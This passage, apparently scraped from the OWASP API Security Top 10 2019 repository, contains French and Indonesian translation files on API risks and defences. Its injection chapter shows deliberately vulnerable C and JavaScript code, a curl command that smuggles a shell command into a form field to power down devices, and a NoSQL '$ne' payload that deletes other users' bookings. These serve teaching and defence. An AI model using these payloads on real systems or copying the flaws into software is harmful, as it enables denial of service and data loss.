attaquants, si applicable, définissez et implémentez\n  des schémas pour toutes les réponses y compris les erreurs.\n* Assurez-vous que l'API ne soit accessible qu'avec des verbes HTTP\n  spécifiques. Tous les autres verbes HTTP doivent être désactivés (ex :`HEAD`).\n* Les API devant être accessibles via des clients basés sur des navigateurs\n  (ex : WebApp en front-end) doivent implémenter une politique appropriée de \n  partage de ressources entre origines multiples (CORS).\n\n## Références\n\n### OWASP\n\n* [OWASP Secure Headers Project][1]\n* [OWASP Testing Guide: Configuration Management][2]\n* [OWASP Testing Guide: Testing for Error Codes][3]\n* [OWASP Testing Guide: Test Cross Origin Resource Sharing][9]\n\n### Externes\n\n* [CWE-2: Environmental Security Flaws][4]\n* [CWE-16: Configuration][5]\n* [CWE-388: Error Handling][6]\n* [Guide to General Server Security][7], NIST\n* [Let’s Encrypt: a free, automated, and open Certificate Authority][8]\n\n[1]: https://www.owasp.org/index.php/OWASP_Secure_Headers_Project\n[2]: https://www.owasp.org/index.php/Testing_for_configuration_management\n[3]: https://www.owasp.org/index.php/Testing_for_Error_Code_(OTG-ERR-001)\n[4]: https://cwe.mitre.org/data/definitions/2.html\n[5]: https://cwe.mitre.org/data/definitions/16.html\n[6]: https://cwe.mitre.org/data/definitions/388.html\n[7]: https://csrc.nist.gov/publications/detail/sp/800-123/final\n[8]: https://letsencrypt.org/\n[9]: https://www.owasp.org/index.php/Test_Cross_Origin_Resource_Sharing_(OTG-CLIENT-007)\n", "timestamp": "2025-10-24T22:26:33.813458"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fr/0xa8-injection.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fr/0xa8-injection.md", "content": "# API8:2019 Injection\n\n| Facteurs de menace / Vecteurs d'attaque | Faille de sécurité | Impact |\n| - | - | - |\n| Spécifique API : Exploitabilité **3** | Prévalence **2** : Détectabilité **3** | Technique **3** : Spécifique à l'organisation |\n| Les attaquants vont envoyer à l'API des données malveillantes via tout vecteur d'injection disponible (ex : entrée directe, paramètres, services intégrés, etc), en espérant qu'elles soient envoyés à un interpréteur. | Les failles par injection sont très courantes et souvent trouvées dans des requêtes SQL, LDAP, ou NoSQL, des commandes systèmes (OS), des parsers XML et des ORM. Ces failles sont faciles à trouver lors de la revue du code source. Les attaquants peuvent utiliser des scanners et des fuzzers. | L'injection peut aboutir à des divulgations d'informations et des pertes de données. Elle peut aussi aboutir à un déni de service, ou à une prise de contrôle complète de l'hôte. |\n\n## L'API est-elle vulnérable ?\n\nL'API est vulnérables à l'injection si :\n\n* Les données fournies par le client ne sont pas validées, filtrées et épurées\n  par l'API.\n* Les données fournies par le client sont directement utilisées ou concaténées\n  dans des requêtes SQL / NoSQL / LDAP, des commandes de système\n  d'exploitation, des parsers XML ou des mappages objet-relationnel (ORM) /\n  mappages objet-document (ODM).\n* Les données en provenance de systèmes externes (ex : systèmes intégrés) ne\n  sont pas validées, filtrées et épurées par l'API.\n\n## Exemples de scénarios d'attaque\n\n### Scénario #1\n\nLe firmware d'un appareil de contrôle parental dispose d'un point d'accès\n`/api/CONFIG/restore` qui prend en entrée un appId devant être envoyé comme\nparamètre multiparties. Avec un décompilateur, un attaquant découvre que\nl'appId est passé directement dans un appel système sans aucune épuration :\n\n```c\nsnprintf(cmd, 128, \"%srestore_backup.sh /tmp/postfile.bin %s %d\",\n         \"/mnt/shares/usr/bin/scripts/\", appid, 66);\nsystem(cmd);\n```\n\nLa commande suivante permet à l'attaquant d'arrêter tout appareil équipé de ce\nmême firmware vulnérable :\n\n```\n$ curl -k \"https://${deviceIP}:4567/api/CONFIG/restore\" -F 'appid=$(/etc/pod/power_down.sh)'\n```\n\n### Scénario #2\n\nNous avons une application dotée de fonctionnalités CRUD basiques pour les\nopérations de réservation. Un attaquant a réussi à découvrir qu'une injection\nNoSQL pourrait être possible via le paramètre `bookingId` de la chaine de\nrequête pour la suppression d'une réservation. Voici à quoi ressemble cette\nrequête : `DELETE /api/bookings?bookingId=678`.\n\nL'API serveur utilise la fonction suivante pour traiter les requêtes de\nsuppression :\n\n```javascript\nrouter.delete('/bookings', async function (req, res, next) {\n  try {\n      const deletedBooking = await Bookings.findOneAndRemove({'_id' : req.query.bookingId});\n      res.status(200);\n  } catch (err) {\n     res.status(400).json({error: 'Unexpected error occured while processing a request'});\n  }\n});\n```\n\nL'attaquant a intercepté la requête et a remplacé le paramètre `bookingId` de\nla chaine de requête comme indiqué ci-dessous. Dans le cas présent, l'attaquant\na réussi à supprimer la réservation d'un autre utilisateur :\n\n```\nDELETE /api/bookings?bookingId[$ne]=678\n```\n\n## Comment s'en prémunir\n\nPrévenir les injections requiert de séparer les données des commandes et des\nrequêtes.\n\n* Effectuez la validation des données avec une bibliothèque unique, digne de\n  confiance et activement maintenue.\n* Validez, filtrez et épurez toutes les données fournies par le client, ou les\n  autres données en provenance de systèmes intégrés.\n* Les caractères spéciaux doivent être échappés en utilisant la syntaxe\n  spécifique à l'interpréteur cible.\n* Préférez une API sûre qui fournit une interface paramétrée.\n* Limitez toujours le nombre d'enregistrements retournés pour éviter les\n  divulgations de masse en cas d'injection.\n* Validez les données entrantes avec suffisamment de filtres pour accepter\n  uniquement les valeurs valides pour chaque paramètre d'entrée.\n* Définissez des types de données et des schémas stricts pour tous les\n  paramètres de chaines.\n\n## Références\n\n### OWASP\n\n* [OWASP Injection Flaws][1]\n* [SQL Injection][2]\n* [NoSQL Injection Fun with Objects and Arrays][3]\n* [Command Injection][4]\n\n### Externes\n\n* [CWE-77: Command Injection][5]\n* [CWE-89: SQL Injection][6]\n\n[1]: https://www.owasp.org/index.php/Injection_Flaws\n[2]: https://www.owasp.org/index.php/SQL_Injection\n[3]: https://www.owasp.org/images/e/ed/GOD16-NOSQL.pdf\n[4]: https://www.owasp.org/index.php/Command_Injection\n[5]: https://cwe.mitre.org/data/definitions/77.html\n[6]: https://cwe.mitre.org/data/definitions/89.html\n", "timestamp": "2025-10-24T22:26:33.963739"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fr/0xa9-improper-assets-management.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fr/0xa9-improper-assets-management.md", "content": "# API9:2019 Improper Assets Management\n\n| Facteurs de menace / Vecteurs d'attaque | Faille de sécurité | Impact |\n| - | - | - |\n| Spécifique API : Exploitabilité **3** | Prévalence **3** : Détectabilité **2** | Technique **2** : Spécifique à l'organisation |\n| Les anciennes versions des API n'ont souvent pas bénéficié des correctifs de sécurité et sont un moyen facile pour compromettre des systèmes sans avoir à affronter des mécanismes de sécurité de pointe, qui peuvent avoir été mis en place pour protéger les versions les plus récentes de l'API. | Une documentation obsolète rend plus difficile la recherche et / ou la correction de vulnérabilités. L'absence d'inventaire des points actifs et de stratégies de retrait pour ceux ne devant plus être utilisés, conduit à faire tourner des systèmes dépourvus de correctifs de sécurité, entrainant la divulgation de données sensibles. Des hôtes d'API inutilement exposés sont fréquemment trouvés du fait des concepts modernes comme les micro-services, qui rendent les applications faciles à déployer et indépendantes (ex : cloud, aussi appelé informatique en nuage, Kubernetes). | Les attaquants peuvent obtenir accès à des données sensibles, et même prendre le contrôle du serveur via d'anciennes versions non corrigées de l'API connectées à la même base de données. |\n\n## L'API est-elle vulnérable ?\n\nL'API peut être vulnérable si :\n\n* L'objectif de l'hôte de l'API n'est pas clair, et il n'y a pas de réponses\n  explicites aux questions suivantes :\n    * Dans quel environment tourne l'API (ex : production, staging, test,\n      développement) ?\n    * Qui doit avoir un accès réseau à l'API (ex : public, interne,\n      partenaires) ?\n    * Quelle version de l'API tourne ?\n    * Quelles données sont collectées et traitées par l'API (ex : données\n      personnelles) ?\n    * Quel est le flux des données ?\n* Il n'y a pas de documentation, ou la documentation existante n'est pas mise\n  à jour.\n* Il n'y a pas de plan pour le retrait / la désactivation (des points d'accès\n  devenus obsolètes) par version d'API.\n* L'inventaire des hôtes est manquant ou obsolète.\n* L'inventaire des services intégrés, en propre ou par des tiers, est manquant\n  ou obsolète.\n* Des versions anciennes ou antérieures de l'API tournent sans correctifs.\n\n## Exemples de scénarios d'attaque\n\n### Scénario #1\n\nAprès avoir repensé ses applications, un service local de recherche avait\nlaissé une ancienne version de l'API (`api.someservice.com/v1`) tourner sans\nprotection, avec un accès à la base de données clients. En ciblant l'une des\napplications dernièrement publiées, un attaquant a trouvé l'adresse de l'API (`api.someservice.com/v2`). En remplaçant `v2` par `v1` dans l'URL l'attaquant\na obtenu accès à l'ancienne API non protégée, exposant les données personnelles\nde plus de 100 millions d'utilisateurs.\n\n### Scénario #2\n\nUn réseau social avait mis en place un mécanisme de limitation du nombre de\nrequêtes pour empêcher des attaquants d'employer la force brute pour deviner\nles jetons (Token) de réinitialisation des mots de passe. Ce mécanisme n'était pas\nimplémenté au niveau du code de l'API elle-même, mais dans un composant séparé\nsitué entre le client et l'API officielle (`www.socialnetwork.com`).\nUn chercheur découvrit un hôte d'API en beta\n(`www.mbasic.beta.socialnetwork.com`) faisant tourner la même API, y\ncompris le mécanisme de réinitialisation du mot de passe, mais était dépourvu\ndu mécanisme de limitation du nombre de requêtes. Le chercheur fut alors en mesure\nde réinitialiser le mot de passe de n'importe quel utilisateur simplement en\nutilisant la force brute pour deviner le token à 6 chiffres.\n\n## Comment s'en prémunir\n\n* Inventoriez tous les hôtes d'API et documentez les aspects importants de\n  chacun d'entre eux, en vous concentrant sur l'environnement de l'API (ex :\n  production, staging, test, développement), sur qui devrait avoir un accès\n  réseau à l'hôte (ex : public, interne, partenaires) et les versions de l'API.\n* Inventoriez les systèmes intégrés et documentez les aspects importants tels\n  que leur rôle dans le système, quelles données sont échangées (flux des\n  données) et leur sensibilité.\n* Documentez tous les aspects de votre API et notamment l'authentification, les\n  erreurs, les redirections, la limitation du nombre de requêtes, la politique\n  de partage de ressources entre origines multiples (CORS) et les points\n  d'accès, incluant leurs paramètres, les requêtes et les réponses.\n* Générez la documentation automatiquement en adoptant des standards ouverts.\n  Intégrez cette génération automatique de la documentation dans votre processus de déploiement continu CI/CD.\n* Donnez accès à la documentation de l'API aux personnes autorisées à utiliser\n  l'API.\n* Utilisez des mesures de protection externes telles les pare-feux de\n  sécurité pour API, et ce, pour toutes les versions exposées de vos API, pas\n  seulement pour la version courante en production.\n* Évitez d'utiliser des données de production avec des déploiements d'API\n  autres que ceux de production. Si vous ne pouvez l'évitez, ces points d'accès\n  doivent bénéficier du même niveau de sécurité que ceux de production.\n* Lorsque de nouvelles versions d'API intègrent des améliorations de\n  sécurité, effectuez une analyse de risque pour décider les actions\n  d'atténuation requises pour l'ancienne version : par exemple, s'il est ou non\n  possible de rétro-porter les améliorations sans rompre la compatibilité ou si\n  vous devez retirer rapidement l'ancienne version et forcer tous les clients à\n  passer à la dernière version.\n\n## Références\n\n### Externes\n\n* [CWE-1059: Incomplete Documentation][1]\n* [OpenAPI Initiative][2]\n\n[1]: https://cwe.mitre.org/data/definitions/1059.html\n[2]: https://www.openapis.org/\n", "timestamp": "2025-10-24T22:26:34.080467"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fr/0xaa-insufficient-logging-monitoring.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fr/0xaa-insufficient-logging-monitoring.md", "content": "# API10:2019 Insufficient Logging & Monitoring\n\n| Facteurs de menace / Vecteurs d'attaque | Faille de sécurité | Impact |\n| - | - | - |\n| Spécifique API : Exploitabilité **2** | Prévalence **3** : Détectabilité **1** | Technique **2** : Spécifique à l'organisation |\n| Les attaquants exploitent l'absence de logging et de monitoring pour utiliser frauduleusement des systèmes sans se faire repérer. | En l'absence de logging et de monitoring, ou si le logging et le monitoring sont insuffisants, il est pratiquement impossible de suivre des activités suspectes et d'y répondre rapidement. | Sans visibilité sur les activités malveillantes en cours, les attaquants disposent de beaucoup de temps et peuvent compromettre complètement les systèmes. |\n\n## L'API est-elle vulnérable ?\n\nL'API is vulnérable si :\n\n* Elle ne produit pas de logs, le niveau de logging n'est pas réglé\n  correctement, ou les messages de log ne comportent pas suffisamment\n  d'informations.\n* L'intégrité des logs ne peut pas être garantie (ex : [Log Injection][1]).\n* Les logs ne sont pas monitorés en permanence.\n* L'infrastructure de l'API n'est pas monitorée en permanence.\n\n## Exemples de scénarios d'attaque\n\n### Scénario #1\n\nLes clés d'accès d'une API d'administration ont fuité sur un répertoire public.\nLe propriétaire du répertoire a été notifié par e-mail à propos de cette fuite\npotentielle, mais a mis plus de 48 heures à réagir à l'incident, et\nl'exposition des clés d'accès peut avoir permis l'accès à des données\npersonnelles. Du fait d'un logging insuffisant, l'entreprise n'est pas capable\nd'évaluer quelles données ont pu être consultées par des acteurs malveillants.\n\n### Scénario #2\n\nUne plate-forme de partage de vidéos a subi une attaque par bourrage\nd'identifiants de “grande ampleur”. Malgré le log des essais infructueux,\naucune alerte n'a été émise pendant la durée de l'attaque. En réaction aux\nplaintes des utilisateurs, les logs de l'API ont été analysés et l'attaque a\nété détectée. L'entreprise a dû faire une annonce publique pour demander aux\nutilisateurs de réinitialiser leur mot de passe, et a dû déclarer l'incident\naux autorités de contrôle.\n\n## Comment s'en prémunir\n\n* Loggez toutes les tentatives infructueuses d'authentification, les accès\n  refusés et les erreurs de validations des données entrées.\n* Les logs doivent être formatés pour pouvoir être traités par un outil de\n  gestion des logs, et doivent inclure suffisamment d'informations pour pouvoir\n  identifier un acteur malveillant.\n* Les logs doivent être considérés comme des données sensibles, et leur\n  intégrité doit être garantie durant leur stockage comme au cours de leur transfert.\n* Configurez un système de monitoring pour surveiller en permanence\n  l'infrastructure, le réseau et le fonctionnement de l'API.\n* Utilisez un système d'information et de gestion des événements (SIEM) pour\n  agréger et gérer les logs de tous les composants de la pile de l'API et des\n  hôtes.\n* Configurez des tableaux de bord et des alertes personnalisés, permettant la\n  détection et le traitement plus rapide d'activités suspectes.\n\n## Références\n\n### OWASP\n\n* [OWASP Logging Cheat Sheet][2]\n* [OWASP Proactive Controls: Implement Logging and Intrusion Detection][3]\n* [OWASP Application Security Verification Standard: V7: Error Handling and\n  Logging Verification Requirements][4]\n\n### Externes\n\n* [CWE-223: Omission of Security-relevant Information][5]\n* [CWE-778: Insufficient Logging][6]\n\n[1]: https://www.owasp.org/index.php/Log_Injection\n[2]: https://www.owasp.org/index.php/Logging_Cheat_Sheet\n[3]: https://www.owasp.org/index.php/OWASP_Proactive_Controls\n[4]: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x15-V7-Error-Logging.md\n[5]: https://cwe.mitre.org/data/definitions/223.html\n[6]: https://cwe.mitre.org/data/definitions/778.html\n", "timestamp": "2025-10-24T22:26:34.215776"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fr/0xb0-next-devs.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fr/0xb0-next-devs.md", "content": "# Perspectives pour les Développeurs\n\nCréer ou maintenir la sécurité d'un logiciel, ou corriger un logiciel existant, peut s'avérer difficile. Il en va de même pour les API.\n\nNous pensons que l'éducation et la connaissance sont des facteurs clés pour écrire des logiciels sécurisés. L'atteinte de cet objectif repose ensuite sur **la mise en place et l'utilisation de processus de sécurité reproductibles et de contrôles de sécurité standards**.\n\nL'OWASP propose de nombreuses ressources gratuites et libres pour aborder la sécurité dès le début d'un projet. Veuillez visiter la [page des projets OWASP][1] pour connaitre la liste complète des projets disponibles.\n\n| | |\n|-|-|\n| **Éducation** | Vous pouvez commencer par lire les [projets de la catégorie OWASP Education][2] en fonction de votre profession de votre intérêt. Pour une approche plus pratique, nous avons ajouté le projet **crAPI** - **C**ompletely **R**idiculous **API** à  [notre roadmap][3]. En attendant, vous pouvez vous entrainer à la sécurité des applis web avec le [module OWASP DevSlop Pixi][4], une WebApp et un service d'API volontairement vulnérables destinés à apprendre aux utilisateurs comment tester la sécurité des applications web modernes et des services d'API, et comment développer des API plus sécurisées à l'avenir. Vous pouvez également participer à des sessions de formation de [conférence OWASP AppSec][5], ou [rejoindre une section OWASP locale][6]. |\n| **Besoins de Sécurité** | La sécurité doit faire partie de chaque projet dès le début. Lors de la formulation des besoins, il est important de définir ce que \"sécurisé\" signifie pour ce projet. L'OWASP vous recommande d'utiliser le [OWASP Application Security Verification Standard (ASVS)][7] comme guide pour définir vos besoins de sécurité. Si vous sous-traitez, envisagez le projet [OWASP Secure Software Contract Annex][8], qui devra être adapté aux lois et réglementations locales. |\n| **Architecture de Sécurité** | La sécurité doit rester une préoccupation durant toutes les étapes du projet. Les [OWASP Prevention Cheat Sheets][9] sont un bon point de départ pour guider la conception de la sécurité durant la phase d'architecture. Parmi beaucoup d'autres, vous trouverez la [REST Security Cheat Sheet][10] et la [REST Assessment Cheat Sheet][11]. |\n| **Contrôles de Sécurité Standards** | L'adoption de contrôles de sécurité standards réduit le risque d'introduire des vulnérabilités de sécurité lorsque vous implémentez votre logique métier. Bien que de nombreux frameworks modernes incluent désormais des contrôles standards efficaces, [OWASP Proactive Controls][12] vous fournit un bon résumé des contrôles de sécurité que vous devriez inclure dans votre projet. L'OWASP fournit aussi quelques bibliothèques et outils que vous pourrez trouver utiles, tels que des contrôles de validation. |\n| **Cycle de Développement Logiciel Sécurisé** | Vous pouvez utiliser le [OWASP Software Assurance Maturity Model (SAMM)][13] pour améliorer le processus de développement d'API. Plusieurs autres projets OWASP sont disponibles pour vous aider durant les différentes phases de développement d'API, par ex. le [OWASP Code Review Project][14]. |\n\n[1]: https://www.owasp.org/index.php/Category:OWASP_Project\n[2]: https://www.owasp.org/index.php/OWASP_Education_Material_Categorized\n[3]: https://www.owasp.org/index.php/OWASP_API_Security_Project#tab=Road_Map\n[4]: https://devslop.co/Home/Pixi\n[5]: https://www.owasp.org/index.php/Category:OWASP_AppSec_Conference\n[6]: https://www.owasp.org/index.php/OWASP_Chapter\n[7]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[8]: https://www.owasp.org/index.php/OWASP_Secure_Software_Contract_Annex\n[9]: https://www.owasp.org/index.php/OWASP_Cheat_Sheet_Series\n[10]: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/REST_Security_Cheat_Sheet.md\n[11]: https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/REST_Assessment_Cheat_Sheet.md\n[12]: https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2018\n[13]: https://www.owasp.org/index.php/OWASP_SAMM_Project\n[14]: https://www.owasp.org/index.php/Category:OWASP_Code_Review_Project\n", "timestamp": "2025-10-24T22:26:34.328752"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fr/0xb1-next-devsecops.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fr/0xb1-next-devsecops.md", "content": "# Perspectives pour les DevSecOps\n\nDu fait de leur importance dans les architectures des applications modernes, il\nest crucial de construire des API sécurisées. La sécurité ne peut pas être\nnégligée, et elle doit faire partie de l'ensemble du processus de\ndéveloppement. Effectuer un scan et un test d'intrusion annuel n'est plus\nsuffisant.\n\nLes DevSecOps doivent participer à l'effort de développement et faciliter les\ntests continus de sécurité sur l'ensemble du cycle de vie du développement\nlogiciel. Leur but est d'améliorer le processus de développement avec une\nautomatisation de la sécurité, sans impacter la vitesse de développement.\n\nEn cas de doute, tenez-vous informé et consultez souvent le [DevSecOps Manifesto][1].\n\n| | |\n|-|-|\n| **Compréhension du modèle de menaces** | Les priorités de tests sont déterminées par le modèle de menaces. Si vous n'en avez pas, envisagez d'utiliser notre [OWASP Application Security Verification Standard (ASVS)][2], et notre [OWASP Testing Guide][3] comme bases. Impliquer l'équipe de développement peut contribuer à les rendre plus conscients de la sécurité. |\n| **Comprendre le SDLC** | Joignez-vous à l'équipe de développement pour mieux comprendre le cycle de développement logiciel (SDLC - Software Development Life Cycle). Votre contribution aux tests de sécurité continus doit être compatible avec les personnes, les procédés et les outils. Tout le monde doit adhérer à la démarche, afin d'éviter des frictions ou de la résistance inutiles. |\n| **Stratégies de tests** | Comme votre travail ne doit pas impacter la vitesse de développement, vous devez choisir judicieusement la meilleure technique (simple, la plus rapide, la plus juste) pour vérifier les exigences de sécurité. Les projets [OWASP Security Knowledge Framework][4] et [OWASP Application Security Verification Standard][5] peuvent constituer d'excellentes sources d'exigences de sécurité fonctionnelles et non-fonctionnelles. Il existe également d'autres ressources et contenus de qualité tels les [projets][6] et [outils][7] proposés par la [communauté DevSecOps][8]. |\n| **Obtention de couverture et précision** | Vous êtes le lien entre les développeurs (Dev) et les équipes opérationnelles (Ops). Pour réaliser la couverture, vous devez vous concentrer non seulement sur la fonctionnalité, mais aussi sur l'orchestration. Travaillez en étroite relation à la fois avec les équipes de développement et des opérations (infra) dès le début pour pouvoir optimiser votre temps et vos efforts. Vous devez viser un état où la sécurité essentielle est vérifiée continuellement. |\n| **Communication claire des résultats** | Apportez de la valeur avec pas ou peu de friction. Alertez promptement sur vos découvertes, en utilisant les moyens et outils mis en oeuvres par vos équipes (pas dans des fichiers PDF). Joignez-vous à l'équipe de développement pour résoudre ces problèmes. Profitez de l'occasion pour les instruire, en décrivant clairement la vulnérabilité et la manière dont elle peut être exploitée, avec un scénario d'attaque pour la rendre réelle. |\n\n[1]: https://www.devsecops.org/\n[2]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[3]: https://www.owasp.org/index.php/OWASP_Testing_Project\n[4]: https://www.owasp.org/index.php/OWASP_Security_Knowledge_Framework\n[5]: https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project\n[6]: http://devsecops.github.io/\n[7]: https://github.com/devsecops/awesome-devsecops\n[8]: http://devsecops.org\n", "timestamp": "2025-10-24T22:26:34.450679"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fr/0xd0-about-data.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fr/0xd0-about-data.md", "content": "# Méthodologie et Données\n\n## Présentation\n\nComme l'industrie de la sécurité applicative n'est pas spécifiquement concentrée\nsur les architectures applicatives les plus récentes, dans lesquelles les API\njouent un rôle important, il aurait été difficile de compiler une liste des dix\nrisques de sécurité les plus critiques pour les API en s'appuyant sur un appel\npublic à informations. Bien qu'il n'y ait pas eu de tel appel public\nà informations, la liste résultante composant le Top 10 est basée sur des\ninformations publiquement accessibles, des contributions d'experts en sécurité,\net des discussions ouvertes avec la communauté de la sécurité.\n\n## Méthodologie\n\nDans un premier temps, des informations publiquement disponibles sur des\nincidents de sécurité concernant des API ont été collectées, évaluées, et\ncatégorisées par un groupe d'experts en sécurité. Ces données ont été collectées\nà partir de plateformes de prime aux bogues (bug bounty) et de bases de données de vulnérabilités,\nsur une période d'un an, à des fins statistiques.\n\nDans un deuxième temps, il a été demandé à des praticiens de la sécurité\nexpérimentés en tests d'intrusion de compiler leur propre Top 10.\n\nLa [méthodologique d'évaluation de risque OWASP][1] a été utilisée pour\neffectuer l'analyse de risques. Les scores ont été discutés et évalués par les\npraticiens de la sécurité. Sur ces questions, veuillez vous référer à la section\ndes [risques de sécurité des API][2].\n\nLa première ébauche de l'OWASP API Security Top 10 2019 résultait d'un consensus\nentre les données statistiques de la première phase et les listes des praticiens\nen sécurité. Cette ébauche a ensuite été soumise pour avis et évaluation à un\nautre groupe de praticiens de la sécurité disposant d'expériences en lien avec\nla sécurité des API.\n\nLe OWASP API Security Top 10 2019 a été présenté pour la première fois lors de\nl'événement OWASP Global AppSec Tel Aviv (mai 2019). Depuis lors, il a été mis\nà disposition sur GitHub pour permettre discussions et contributions publiques.\n\nLa liste des contributeurs est disponible dans la section des [Remerciements][3].\n\n[1]: https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology\n[2]: ./0x10-api-security-risks.md\n[3]: ./0xd1-acknowledgments.md\n", "timestamp": "2025-10-24T22:26:34.563906"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/fr/0xd1-acknowledgments.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/fr/0xd1-acknowledgments.md", "content": "# Remerciements\n\n## Remerciements aux Contributeurs\n\nNous voulons remercier les contributeurs suivants qui ont contribué publiquement\nsur GitHub ou par d'autres moyens :\n\n* 007divyachawla\n* Abid Khan\n* Adam Fisher\n* anotherik\n* bkimminich\n* caseysoftware\n* Chris Westphal\n* dsopas\n* DSotnikov\n* emilva\n* ErezYalon\n* flascelles\n* Guillaume Benats\n* IgorSasovets\n* Inonshk\n* JonnySchnittger\n* jmanico\n* jmdx\n* Keith Casey\n* kozmic\n* LauraRosePorter\n* Matthieu Estrade\n* nathanawmk\n* PauloASilva\n* pentagramz\n* philippederyck\n* pleothaud\n* r00ter\n* Raj kumar\n* Sagar Popat\n* Stephen Gates\n* thomaskonrad\n* xycloops123\n", "timestamp": "2025-10-24T22:26:34.677385"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/id/0x00-header.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/id/0x00-header.md", "content": "---\ntitle: ''\n---\n\n![OWASP LOGO](./images/owasp-logo.png)\n\n# OWASP API Security Top 10 2019\n\nSepuluh Risiko Keamanan API yang Paling Kritis\n\n29 Mei 2019\n\n![WASP Logo URL TBA](./images/front-wasp.png)\n\n| | | |\n| - | - | - | \n| https://owasp.org | Karya ini dilisensikan di bawah [Creative Commons Attribution-ShareAlike 4.0 International License][1] | ![Creative Commons License Logo](images/front-cc.png) |\n\n[1]: http://creativecommons.org/licenses/by-sa/4.0/\n\n", "timestamp": "2025-10-24T22:26:35.346981"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/id/0x00-notice.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/id/0x00-notice.md", "content": "# Pemberitahuan \n\nIni adalah versi teks dari OWASP API Security Top 10, digunakan sebagai sumber untuk versi resmi yang didistribusikan sebagai Portable Document Format (PDF).\n\nKontribusi terhadap proyek seperti komentar, koreksi, atau terjemahan harus dilakukan di sini. Untuk detail tentang [Cara Berkontribusi][1], harap mengacu pada [CONTRIBUTING.md][1].\n\n* Erez Yallon\n* Inon Shkedy\n\n[1]: ../../../CONTRIBUTING.md\n\n", "timestamp": "2025-10-24T22:26:35.466029"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/id/0x00-toc.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/id/0x00-toc.md", "content": "# Daftar Isi\n\n* [Daftar Isi](0x00-toc.md)\n* [Tentang OWASP](0x01-about-owasp.md)\n* [Kata Pengantar](0x02-foreword.md)\n* [Pengenalan](0x03-introduction.md)\n* [Catatan Rilis](0x04-release-notes.md)\n* [Ancaman Keamanan API](0x10-api-security-risks.md)\n* [OWASP Top 10 Ancaman Keamanan API – 2019](0x11-t10.md)\n* [API1:2019 Otorisasi Objek Rusak](0xa1-broken-object-level-authorization.md)\n* [API2:2019 Otentikasi Pengguna Rusak](0xa2-broken-user-authentication.md)\n* [API3:2019 Paparan Data Berlebihan](0xa3-excessive-data-exposure.md)\n* [API4:2019 Kurangnya Sumber Daya & Pembatasan Tingkat](0xa4-lack-of-resources-and-rate-limiting.md)\n* [API5:2019 Otorisasi Tingkat Fungsi Rusak](0xa5-broken-function-level-authorization.md)\n* [API6:2019 Penugasan Massal](0xa6-mass-assignment.md)\n* [API7:2019 Konfigurasi Keamanan yang Salah](0xa7-security-misconfiguration.md)\n* [API8:2019 Injeksi](0xa8-injection.md)\n* [API9:2019 Pengelolaan Aset yang Tidak Tepat](0xa9-improper-assets-management.md)\n* [API10:2019 Pencatatan & Pemantauan yang Kurang Memadai](0xaa-insufficient-logging-monitoring.md)\n* [Apa yang Selanjutnya untuk Pengembang](0xb0-next-devs.md)\n* [Apa yang Selanjutnya untuk DevSecOps](0xb1-next-devsecops.md)\n* [Metodologi dan Data](0xd0-about-data.md)\n* [Ucapan Terima Kasih](0xd1-acknowledgments.md)", "timestamp": "2025-10-24T22:26:35.575135"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/id/0x01-about-owasp.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/id/0x01-about-owasp.md", "content": "# Tentang OWASP \n\nOpen Web Application Security Project (OWASP) adalah komunitas terbuka yang didedikasikan\nuntuk memungkinkan organisasi mengembangkan, membeli, dan memelihara aplikasi dan\nAPI yang dapat dipercaya.\n\nDi OWASP, Anda akan menemukan yang gratis dan terbuka:\n\n* Alat dan standar keamanan aplikasi.\n* Buku lengkap tentang pengujian keamanan aplikasi, pengembangan kode yang aman, dan \n  tinjauan kode yang aman.\n* Presentasi dan [video][1].\n* [Lembar cheats][2] tentang banyak topik umum. \n* Kontrol keamanan dan pustaka standar.\n* [Chapter lokal di seluruh dunia][3].\n* Penelitian mutakhir.\n* [Konferensi luas di seluruh dunia][4].\n* [Mailing list][5].\n\nPelajari lebih lanjut di: [https://www.owasp.org][6].\n\nSemua alat OWASP, dokumen, video, presentasi, dan bab bebas dan\nterbuka untuk siapa saja yang tertarik meningkatkan keamanan aplikasi.\n\nKami menganjurkan pendekatan keamanan aplikasi sebagai masalah orang, proses, dan\nteknologi, karena pendekatan keamanan aplikasi paling efektif memerlukan peningkatan di bidang ini.\n\nOWASP adalah jenis organisasi baru. Kebebasan kami dari tekanan komersial\nmemungkinkan kami untuk menyediakan informasi keamanan aplikasi yang tidak memihak, praktis, dan hemat biaya. \n\nOWASP tidak berafiliasi dengan perusahaan teknologi mana pun, meskipun kami mendukung\npenggunaan teknologi keamanan komersial yang cerdas. OWASP memproduksi banyak jenis\nbahan dengan cara kolaboratif, transparan, dan terbuka.\n\nYayasan OWASP adalah entitas nirlaba yang memastikan kesuksesan jangka panjang proyek.\nHampir semua orang yang terkait dengan OWASP adalah relawan,\ntermasuk dewan OWASP, pemimpin 